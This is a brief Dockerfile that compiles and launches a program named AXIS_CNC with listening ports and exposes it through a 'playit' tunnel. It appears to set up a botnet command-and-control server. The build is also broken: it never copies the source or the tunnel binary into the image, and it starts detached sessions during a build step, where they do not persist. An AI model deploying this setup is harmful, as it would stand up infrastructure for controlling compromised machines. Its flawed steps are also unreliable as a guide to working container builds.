FROM ubuntu:latest
RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y tzdata tmux screen gcc && \
    ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime && \
    dpkg-reconfigure --frontend noninteractive tzdata && \
    chmod 777 playit && \
    gcc -o AXIS AXIS_CNC.c -pthread && \
    screen -dmS AXIS_session bash -c './AXIS 35829 1 35821' && \
    tmux new-session -d -s playit_session './playit'